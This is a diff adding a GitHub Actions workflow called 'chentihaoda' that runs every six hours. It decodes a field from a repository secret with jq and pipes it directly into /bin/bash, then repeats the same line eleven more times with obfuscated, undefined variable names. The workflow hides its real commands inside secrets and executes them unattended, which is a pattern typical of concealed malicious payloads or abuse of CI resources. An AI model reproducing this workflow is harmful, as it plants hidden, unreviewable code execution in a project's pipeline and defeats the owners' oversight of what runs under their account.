@@ -1,0 +1,28 @@
+name: chentihaoda
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chentihaoda
+        env:
+          fwd25512: ${{ secrets.fwd25512 }}
+        run: |
+          echo $fwd25512 | jq -r .cpcoh6 | /bin/bash
+          echo $tqx516 | jq -r .rhlxh77 | /bin/bash
+          echo $nzyy7109 | jq -r .qp48 | /bin/bash
+          echo $mrgxq5 | jq -r .zolqm83897 | /bin/bash
+          echo $fb60 | jq -r .q1512 | /bin/bash
+          echo $nseug69 | jq -r .wj88 | /bin/bash
+          echo $erslj0269 | jq -r .qfshj1793 | /bin/bash
+          echo $qnff6 | jq -r .s0187 | /bin/bash
+          echo $efhyy964 | jq -r .c060 | /bin/bash
+          echo $ja253 | jq -r .y74 | /bin/bash
+          echo $l01 | jq -r .xg67074 | /bin/bash
+          echo $jau8 | jq -r .a82095 | /bin/bash
+
